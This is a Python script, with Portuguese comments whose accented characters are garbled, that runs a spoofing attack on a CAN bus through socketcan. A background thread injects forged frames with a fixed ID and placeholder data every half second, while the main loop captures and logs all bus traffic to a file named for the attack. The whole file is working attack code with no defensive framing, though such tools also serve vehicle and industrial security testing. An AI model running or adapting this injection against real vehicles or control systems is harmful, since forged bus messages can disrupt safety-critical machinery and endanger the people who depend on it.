import can
import time
import logging
import threading

# ================================
# CONFIGURAÃ‡Ã•ES
# ================================
CAN_CHANNEL = 'can0'          # Interface CAN
CAN_BUSTYPE = 'socketcan'     # Tipo do barramento
SPOOF_ID = 0x123               # ID falsificado
SPOOF_DATA = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]  # Dados falsos
SPOOF_INTERVAL = 0.5          # Intervalo entre pacotes falsos (segundos)
LOG_FILE = "spoofing_attack.log"

# ================================
# CONFIGURAÃ‡ÃƒO DO LOG
# ================================
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# ================================
# FUNÃ‡ÃƒO PARA GERAR PACOTES FALSOS
# ================================
def spoofing_attack(bus):
    while True:
        msg = can.Message(
            arbitration_id=SPOOF_ID,
            data=SPOOF_DATA,
            is_extended_id=False
        )
        try:
            bus.send(msg)
            print(f"[SPOOF] Enviado ID={hex(SPOOF_ID)} Dados={SPOOF_DATA}")
        except can.CanError as e:
            print(f"[ERRO] NÃ£o foi possÃ­vel enviar mensagem: {e}")
        time.sleep(SPOOF_INTERVAL)

# ================================
# FUNÃ‡ÃƒO PARA COLETAR E REGISTRAR PACOTES
# ================================
def collect_messages(bus):
    for msg in bus:
        payload = " ".join(f"{byte:02X}" for byte in msg.data)
        log_line = f"{msg.timestamp:.6f} CH={msg.channel} ID={hex(msg.arbitration_id)} DATA={payload}"
        print(f"[CAPTURA] {log_line}")
        logging.info(log_line)

# ================================
# MAIN
# ================================
if __name__ == "__main__":
    # Inicializa interface CAN
    bus = can.interface.Bus(channel=CAN_CHANNEL, bustype=CAN_BUSTYPE)

    try:
        # Thread para gerar spoofing
        threading.Thread(target=spoofing_attack, args=(bus,), daemon=True).start()

        # Captura mensagens (loop principal)
        collect_messages(bus)

    except KeyboardInterrupt:
        print("\nEncerrando...")
    finally:
        bus.shutdown()